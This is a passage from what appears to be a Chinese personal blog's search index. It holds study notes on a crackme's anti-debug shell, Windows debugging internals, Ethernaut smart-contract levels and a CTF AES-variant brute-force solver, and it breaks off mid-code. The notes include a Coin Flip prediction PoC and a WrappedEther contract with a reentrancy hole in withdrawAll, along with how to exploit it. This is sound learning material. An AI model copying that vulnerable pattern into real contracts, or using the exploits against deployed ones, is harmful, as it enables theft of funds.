class="line">std::cout &lt;&lt; loginResult.loginResultNum &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 开发 </category>
          
          <category> 语言学习 </category>
          
          <category> 网络编程 </category>
          
          <category> CPP </category>
          
          <category> 网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> 网络 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>吾爱2025解题领红包5windows高级题简要分析</title>
      <link href="/posts/43ad3f3c.html"/>
      <url>/posts/43ad3f3c.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>这个题很有意思<br>但是第一关就卡了我很久<br>这里记录一下我是怎么分析的</p><h2 id="壳">壳</h2><p>这个壳的反调试部分在TlsCallback_0函数的第二次call rax中<br>7FF708E27DB0这个函数,通过7FF708E26280判断是否有调试和7FF708E244A0判断是否有hook,然后获得一个标志位放到flag_a中</p><p><img src="https://s2.loli.net/2025/02/16/WV1t7PzX5OiGBDK.png" alt="image-20250216210356149"></p><p>在jmp rax中跳转到7FF708E24400执行setThreadInfomation函数的位置,传参是-(flag_a != 1) ^ 0x11<br>如果标志位为1说明是调试,会直接触发hidefromdebug效果,如果标志为2则会传入错误的setInfomatinon值,最后会传出0xC000003导致显示环境异常.如果标志为5,表明正常不会进行检查.</p><p>第二点,这里调试的时候如果对后面SMC解密的代码下了断点0xcc,则会导致它还原失败,所以这里是不能提前下断点的</p><h2 id="流程分析">流程分析</h2><p>通过hook getItemDialog函数的ret，可以找到按钮按下时哪里读取了，这里对flag进行了检查，然后生成了一个结构放入临界区就结束了。说明这是多线程的程序</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>win-调试原理</title>
      <link href="/posts/6e648a52.html"/>
      <url>/posts/6e648a52.html</url>
      
        <content type="html"><![CDATA[<h2 id="X86的主要调试设施">X86的主要调试设施</h2><p>INT 3 指令   软件断点基础<br>追踪标志TF   单步追踪的基础<br>调试寄存器   硬件寄存器的基础<br>分支监视和记录   按分支单步的基础</p><h2 id="软件断点">软件断点</h2><p>0xCC int3指令<br>机器码为1字节，无数量限制，只支持代码段(可执行的段)，且不支持在只读存储器中使用</p><p>将一个int 3 写入，触发异常break之后会被恢复，再执行后会再次写入</p><h2 id="硬件断点">硬件断点</h2><p>通过调试寄存器实现，DR0到DR3 的四个寄存器中存放目标地址<br>DR7有8组设置标志位，每组分别有2个2位标志，其中一个标志表示R/W，另一个标志表示长度<br>CPU每执行1步就进行一次匹配，如果是这个地址，模式正确，就会写入DR6的标志位，然后触发断点(产生1号异常)，操作系统通过检查标志位知道哪一个命中了断点</p><p>由于每个线程的寄存器信息独立保存，所以每个线程都可以设4个地址</p><h2 id="陷阱标志">陷阱标志</h2><p>标志寄存器efl(ag)的TF位<br>单步异常在efl的最低位。每当efl最后一位是1，系统会自动置0，然后触发单步异常</p><h2 id="异常">异常</h2><p>前面几节已经差不多说明了，这里就不赘述了。不过在程序中，尤其是VS生成的代码，一般来说低级的异常往往会封装成Cxx异常。</p><h3 id="中断向量表">中断向量表</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span>除零异常</span><br><span class="line"><span class="symbol">1 </span>调试异常</span><br><span class="line"><span class="symbol">3 </span>断点异常</span><br><span class="line"><span class="symbol">4 </span>溢出异常</span><br><span class="line"><span class="symbol">5 </span>数组越界异常</span><br><span class="line"><span class="symbol">6 </span>非法指令异常</span><br><span class="line"><span class="symbol">13 </span>保护异常</span><br><span class="line"><span class="symbol">14 </span>缺页异常</span><br><span class="line"><span class="symbol">18 </span>机器检查异常</span><br><span class="line"><span class="number">32</span>-<span class="number">255</span> 用户自定义，很多是中断，而不是异常</span><br></pre></td></tr></table></figure><h3 id="来源">来源</h3><p>CPU产生 执行指令检测到的错误，机器异常，调试异常等<br>程序产生，RaiseException win32api<br>C++ throw E</p><h2 id="JTAG">JTAG</h2><p>硬件调试标准</p><h2 id="用户态调试模型XP">用户态调试模型XP</h2><p>断点命中时，CPU立即切换到内核执行一系列异常处理函数。其中KISystemService调用KiRaiseException()产生异常KiDebugService和KiTrap04~00做分发准备。KiDispatchException()是分发中枢，会通知用户态调试子系统Dbgk，然后触发DbgkForwardExcption()，如果有调试器执行DbgkpSendApiMessages()继续传递，到DbgkQueueMessage()生成调试事件并将产生的调试对象挂到内核调试对象队列中。调试器一直等待这个队列，有调试对象时就会取出并处理。</p><h3 id="调试器的载入程序">调试器的载入程序</h3><p>一般情况下，会在目标进程创建一个线程执行int 3，但是系统在分发异常时会冻结所有线程</p><h2 id="KiDisPatchException">KiDisPatchException</h2><p>用户态异常内含2轮异常分发：<br>第一轮：</p><p>如果没有用户态调试器，尝试分发给内核调试器<br>DbgkForwardException尝试交给用户态调试器<br>复制栈帧然后改程序指针到KeUserExceptionDispatcher到用户态</p><p>第二轮：</p><p>DbgkForwardException尝试交给用户态调试器<br>然后尝试交给服务进程，让服务进程做最后处理，一般直接杀死<br>如果还是不处理，直接调用ZwTerminateProcess在内核态杀死</p><blockquote><p>产生硬件异常通过 IDT调用异常处理例程， 产生软件异常通过 API的层层调用产地异常信息。而异常又由于发生位置不同，分为内核异常和用户态异常，二者最后都会靠 <code>kiDispathException</code>函数来进行异常分发；<br>当内核产生异常时，程序处理流程进入到 <code>KiDispatchException</code>函数，在该函数内备份当前线程 R3 的 <code>TrapFrame</code>（即栈帧的基址）。异常处理首先判断这是否是第一次异常，判断是否存在内核调试器，如果有内核调试器，则把当前的异常信息发送给内核调试器；如果没有内核调试器或者内核调试器没有处该异常 ， 则进入步骤3，调用 <code>RtlDispatchException</code>。<br>内核异常进入 <code>RtlDispatchException</code> 函 数， 如果<code>RtlDispatchException</code> 函数没有处理该异常，那么将再次尝试将异常发送到内核调试器，如果此时内核调试器仍然不存在或者没有处理该异常，那么此时系统会直接蓝屏；<br>如果是用户态异常则经过 <code>KiDispatchException</code>进行用户态异常分发和处理。如果是第一次分发异常，则调用 <code>DbgKForwardException</code>将异常分发到内核调试器；如果内核调试器不存在或没有处理异常，则尝试将异常分发给用户态调试器；如果异常被处理，则进入步骤10；如果用户态调试器不存在或未处理异常，则检测是否是第一次处理异常，如果是第一次处理异常则进入第5步中的异常数据准备；<br>准备一个返回ntdll!<code>KiUserExceptionDispatcher</code> 函数的应用层调用栈，结束本次<code>KiDispatchException</code> 函数的运行，调用<code>KiServiceExit</code> 返回用户层。此时函数栈帧是ntdll!<code>KiUserExceptionDispatcher</code>的执行环境，用户态线程从执行 ntdll!<code>KiUserExceptionDispatcher</code> 开始执行。该函数调用 ntdll!RtlDispatchException进行异常的分发，进入第 6 步；<br>通过 <code>RtlCallVectoredExceptionHandlers</code>遍历 VEH链表尝试查找异常处理函数；如果 VEH未处理异常。则从 fs[0]读取 ExceptionList并开始执行 SEH 函数处理，进入步骤7；<br>如果SEH没有处理函数处理该异常，则检查用户是否通过<code>SetUnhandledExceptionFilter</code>函数注册过进程的异常处理函数，如果用户注册过异常处理函数，调用该异常处理函数，如果异常没有被成功处理或没有自定义的异常处理函数，则进入步骤3；<br>如果最后仍没有处理该异常，便会主动调用 <code>NtRaiseException</code>将该异常重新跑出来，但是此时不是第一次分发，此时 <code>NtRaiseException</code>流程重新调用了 ntdll!<code>KiDispatchException</code>，并再次进入用户态异常的处理分支，进入步骤9；<br>第二次进入用户态异常处理时，不会再尝试发送到内核调试器，也不会再进行异常分发，而是直接尝试发送到用户态体异常调试器，如果最后异常仍未被处理则进入步骤11；<br>异常被处理，调用 NtContine，将之前保存的 TrapFrame还原，程序继续从异常处正常运行；<br>异常不能被处理，系统调用 ntdll!<code>KiDispatchException</code> 调用 ZeTerminateProcess结束进程。</p></blockquote><hr><h2 id="WinDbg常见指令">WinDbg常见指令</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">t step into</span><br><span class="line">p step over</span><br><span class="line">g run</span><br><span class="line">g <span class="keyword">addr </span>转到指定位置</span><br><span class="line"><span class="keyword">bp </span><span class="keyword">addr </span>下软件断点</span><br><span class="line"><span class="keyword">ba </span><span class="keyword">addr </span>下硬件断点</span><br><span class="line">r 显示寄存器</span><br><span class="line">r register 显示指定寄存器</span><br><span class="line">u 显示下一条指令</span><br><span class="line">u <span class="keyword">addr </span>看对应地址指令</span><br><span class="line">u L10 显示下<span class="number">10</span>行指令</span><br><span class="line">ub 显示上一条指令</span><br><span class="line">k 看栈回溯</span><br><span class="line">~* 看当前线程</span><br><span class="line">~num k 看某个（序号为num）线程的栈回溯</span><br><span class="line">x moduleName!*funcName 在对应位置设置断点</span><br><span class="line"><span class="keyword">bp </span>moduleName!funcName <span class="string">&quot;指令&quot;</span> 断点命中后执行指令,比如<span class="string">&quot;.echo *********;k;gc&quot;</span>自动k然后go</span><br><span class="line">sxe ld 模块加载时停止</span><br><span class="line">lm 显示加载的模块</span><br><span class="line">dt (<span class="keyword">display </span>type)显示类型</span><br><span class="line">dt struct name 显示结构成员</span><br><span class="line">dt struct name <span class="keyword">address </span>将目标地址当作结构体显示</span><br></pre></td></tr></table></figure><p>以Noninvasive模式可以只读的形式附加</p><h2 id="参考资料">参考资料</h2><p><a href="https://www.bilibili.com/video/BV1A4411D7xx?p=2">2.概览和软件断点_哔哩哔哩_bilibili</a></p><p><a href="https://zhuanlan.zhihu.com/p/573449712">windows SEH分析 - 知乎</a></p><p><a href="https://blog.csdn.net/LPWSTR/article/details/78714486?spm=1001.2014.3001.5501">Windows异常世界历险记（二）——Win32用户层下SEH机制之对RtlUnwind的逆向分析-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> Win内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链安全0-入门</title>
      <link href="/posts/3cedd4ae.html"/>
      <url>/posts/3cedd4ae.html</url>
      
        <content type="html"><![CDATA[<h1>交互</h1><h2 id="以太坊生态">以太坊生态</h2><p>以太坊是一个去中心化,开源且具备智能合约功能的公共区块链平台.</p><h2 id="MetaMask">MetaMask</h2><p>钱包</p><h2 id="助记词-Seed-私钥-公钥-地址">助记词/Seed/私钥/公钥/地址</h2><p>助记词—Seed种子(可逆)<br>生成私钥(单向)<br>生成公钥<br>生成地址</p><h2 id="转账">转账</h2><h2 id="智能合约">智能合约</h2><p>使以太网生态有图灵完备性</p><h3 id="REMIX">REMIX</h3><p>使用的语言:solidity</p><p>inject Provider - MetaMask<br>连接Remix和MetaMask</p><h1>刷题</h1><p><a href="https://ethernaut.openzeppelin.com/level/1">The Ethernaut - Fallback</a></p><h3 id="Fallback">Fallback</h3><p>智能合约也是账户，可以直接转账</p><h3 id="Fallout">Fallout</h3><p>除了constructor函数以外，所有函数都可以调用，在0.8版本之前，如果拼错了构造函数，会导致这个函数可以被直接调用</p><h3 id="Coin-Flip">Coin Flip</h3><p>由于区块链中的很多数据是对所有人可见的，基于这些可见数据进行的伪随机可以很轻松地被预测到下一个随机数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract PoC &#123;</span><br><span class="line">    CoinFlip target;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _target)&#123;</span><br><span class="line">        target = CoinFlip(_target);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function flip() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
            <tag> Solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链安全1-做题</title>
      <link href="/posts/2967681d.html"/>
      <url>/posts/2967681d.html</url>
      
        <content type="html"><![CDATA[<h2 id="level4-Telephone">level4 Telephone</h2><p>tx.addr是原始调用者<br>msg.sender是调用这个合约的调用者</p><p>可以通过让合约调用合约来实现tx.origin不等于msg.sender</p><h2 id="level5-Token">level5 Token</h2><p>减法和加法有溢出，但是0.8版本有内置的检查</p><h2 id="level6-Delegation">level6 Delegation</h2><p>fallback函数<br>函数选择器<br>底层通过不同的值选择不同的函数执行，从而实现执行不同的合约的函数</p><p>委托调用，直接执行目标代码的机器码</p><h2 id="level7-Force">level7 Force</h2><p>如果一个合约没有receive函数，那么就不能向这个合约转账</p><p>但是有一个自毁函数可以把本合约销毁然后将自身以太币发送到指定地址</p><p>selfdestruct(payable _(_to))</p><h2 id="level8-Vault">level8 Vault</h2><p>合约上的所有内容都是公开的，所以可以直接通过查看交易记录得到每一个存放的值</p><h3 id="solidity内存排布">solidity内存排布</h3><p>由变量声明顺序由上至下申请空间，每个插槽32byte，如果插槽位置不够了，就新申请一个，放在新申请的里面</p><p>数组，通过计算keccak§得到初始地址，然后再增加index值</p><h2 id="重入攻击">重入攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.20;</span><br><span class="line"></span><br><span class="line">interface IWrappedEther &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 amount);</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    );</span><br><span class="line">    event Deposit(address indexed from, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed to, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit(address to) external payable;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function withdrawAll() external;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function allowance(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender</span><br><span class="line">    ) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract WrappedEther is IWrappedEther &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function deposit(address to) external payable &#123;</span><br><span class="line">        balanceOf[to] += msg.value;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        sendEth(payable(msg.sender), amount);</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawAll() external &#123;</span><br><span class="line">        sendEth(payable(msg.sender), balanceOf[msg.sender]);</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        emit Withdraw(msg.sender, balanceOf[msg.sender]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        emit Transfer(msg.sender, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        require(</span><br><span class="line">            allowance[from][msg.sender] &gt;= amount,</span><br><span class="line">            &quot;insufficient allowance&quot;</span><br><span class="line">        );</span><br><span class="line">        balanceOf[from] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        allowance[from][msg.sender] -= amount;</span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external &#123;</span><br><span class="line">        allowance[msg.sender][spender] = amount;</span><br><span class="line">        emit Approval(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendEth(address payable to, uint256 amount) private &#123;</span><br><span class="line">        (bool success, ) = to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;failed to send ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在withdrawAll的时候触发，先转账，后withdraw，所以可以在receive再调用这个withdrawAll函数导致多次执行操作。</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
            <tag> Solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湘岚杯RE-复现&lt;1997&gt;</title>
      <link href="/posts/b119ee64.html"/>
      <url>/posts/b119ee64.html</url>
      
        <content type="html"><![CDATA[<h2 id="1997">1997</h2><p>这个题是一个魔改的AES，具体逻辑很清楚，甚至还有符号表</p><p>但是中间这里没想到有什么方法可以逆向，所以直接爆破了</p><p>列混淆：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  t = tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">1</span>] ^ tmp[i] ^ tmp[i + <span class="number">3</span>];</span><br><span class="line">  ciphertext[i] = t ^ tmp[i] ^ mul2(tmp[i] ^ tmp[i + <span class="number">1</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">1</span>] = t ^ tmp[i + <span class="number">1</span>] ^ mul2(tmp[i + <span class="number">1</span>] ^ tmp[i + <span class="number">2</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">2</span>] = t ^ tmp[i + <span class="number">2</span>] ^ mul2(tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">3</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">3</span>] = t ^ tmp[i + <span class="number">3</span>] ^ mul2(tmp[i + <span class="number">3</span>] ^ tmp[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> __cdecl <span class="title function_">mul2</span><span class="params">(<span class="type">uint8_t</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (a &amp; <span class="number">0x80</span>u) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * a;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">2</span> * a) ^ <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tmp是输入值，ciphertext是输出值，这里已知ciphertext，想求tmp，想了一下相互的关系，发现ciphertext相互异或就是t，所以我尝试爆破tmp的值，由于每个tmp是8位，每两个进行一次检查，所以相当于是爆16位，位数比较小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cToTmp</span><span class="params">(<span class="type">uint8_t</span>* tmp, <span class="type">uint8_t</span>* c)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint8_t</span> t = c[i + <span class="number">2</span>] ^ c[i + <span class="number">1</span>] ^ c[i] ^ c[i + <span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t0 = <span class="number">0</span>; t0 &lt;= <span class="number">256</span>; t0++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t1 = <span class="number">0</span>; t1 &lt;= <span class="number">256</span>; t1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i] == (t ^ t0 ^ mul2(t0 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t2 = <span class="number">0</span>; t2 &lt;= <span class="number">256</span>; t2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">1</span>] == (t ^ t1 ^ mul2(t2 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t3 = <span class="number">0</span>; t3 &lt;= <span class="number">256</span>; t3++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">2</span>] == (t ^ t2 ^ mul2(t2 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">3</span>] == (t ^ t3 ^ mul2(t0 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line">tmp[i] = t0;</span><br><span class="line">tmp[i + <span class="number">1</span>] = t1;</span><br><span class="line">tmp[i + <span class="number">2</span>] = t2;</span><br><span class="line">tmp[i + <span class="number">3</span>] = t3;</span><br><span class="line"><span class="comment">//printf(&quot;%x %x %x %x\n&quot;, tmp[i], tmp[i + 1], tmp[i + 2], tmp[i + 3]);</span></span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">next:;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个测试下来确实可以得到一开始的答案，所以最后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 